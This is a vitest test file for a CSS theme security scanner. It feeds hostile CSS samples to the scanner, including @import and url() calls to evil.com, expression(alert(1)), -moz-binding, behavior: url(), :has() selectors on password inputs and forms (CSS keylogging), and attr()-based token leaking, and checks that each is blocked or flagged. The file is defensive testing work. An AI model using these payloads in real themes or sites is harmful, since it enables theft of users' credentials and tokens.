//! Tests for CSS security scanner

import { describe, it, expect } from 'vitest';
import { writeFileSync, mkdirSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { execFileSync } from 'node:child_process';

const ROOT = join(import.meta.dirname, '..', '..');
const TMP = join(ROOT, '.test-tmp');

function scanTheme(skinContent: string): { exitCode: number; output: string } {
  mkdirSync(TMP, { recursive: true });
  const path = join(TMP, 'test.skin');
  writeFileSync(path, skinContent);
  try {
    const output = execFileSync('npx', ['tsx', 'scripts/security-scan.ts', '--theme', path], {
      cwd: ROOT,
      encoding: 'utf8',
      stdio: ['pipe', 'pipe', 'pipe'],
    });
    return { exitCode: 0, output };
  } catch (err) {
    const e = err as { status: number; stdout: string };
    return { exitCode: e.status, output: e.stdout };
  } finally {
    rmSync(TMP, { recursive: true, force: true });
  }
}

function makeSkin(customCSS: string): string {
  return `meta:\n  name: test\n  author: test\n  version: "1.0.0"\n  description: test\ntokens: {}\ncustomCSS: |\n${customCSS
    .split('\n')
    .map((l) => `  ${l}`)
    .join('\n')}`;
}

describe('security scanner', () => {
  it('passes clean CSS', () => {
    const { exitCode } = scanTheme(makeSkin('.repo-header { color: red; }'));
    expect(exitCode).toBe(0);
  });

  it('blocks @import', () => {
    const { exitCode, output } = scanTheme(makeSkin('@import url("https://evil.com/steal.css");'));
    expect(exitCode).toBe(1);
    expect(output).toContain('@import');
  });

  it('blocks expression()', () => {
    const { exitCode, output } = scanTheme(makeSkin('div { width: expression(alert(1)); }'));
    expect(exitCode).toBe(1);
    expect(output).toContain('expression()');
  });

  it('blocks -moz-binding', () => {
    const { exitCode, output } = scanTheme(makeSkin('div { -moz-binding: url("xbl"); }'));
    expect(exitCode).toBe(1);
    expect(output).toContain('-moz-binding');
  });

  it('blocks behavior:', () => {
    const { exitCode, output } = scanTheme(makeSkin('div { behavior: url(script.htc); }'));
    expect(exitCode).toBe(1);
    expect(output).toContain('behavior:');
  });

  it('blocks url() with non-allowlisted domain', () => {
    const { exitCode, output } = scanTheme(makeSkin('div { background: url("https://evil.com/img.png"); }'));
    expect(exitCode).toBe(1);
    expect(output).toContain('non-allowlisted');
  });

  it('allows url() with allowlisted domains', () => {
    const { exitCode } = scanTheme(
      makeSkin('div { background: url("https://fonts.googleapis.com/css2"); }'),
    );
    expect(exitCode).toBe(0);
  });

  it('allows data: URLs', () => {
    const { exitCode } = scanTheme(makeSkin('div { background: url("data:image/png;base64,abc"); }'));
    expect(exitCode).toBe(0);
  });

  it('blocks :has() targeting input elements', () => {
    const { exitCode, output } = scanTheme(
      makeSkin(':has(input[type="password"]) { background: red; }'),
    );
    expect(exitCode).toBe(1);
    expect(output).toContain('keylogger');
  });

  it('blocks :has() targeting form', () => {
    const { exitCode, output } = scanTheme(makeSkin(':has(form) { color: red; }'));
    expect(exitCode).toBe(1);
    expect(output).toContain('keylogger');
  });

  it('flags content: attr()', () => {
    const { exitCode, output } = scanTheme(makeSkin('div::after { content: attr(data-token); }'));
    expect(exitCode).toBe(0); // FLAG, not BLOCK
    expect(output).toContain('data leaking');
  });

  it('scans component css blocks too', () => {
    const skin = `meta:
  name: test
  author: test
  version: "1.0.0"
  description: test
tokens: {}
components:
  RepoHeader:
    css: |
      @import url("https://evil.com");`;
    const { exitCode } = scanTheme(skin);
    expect(exitCode).toBe(1);
  });
});
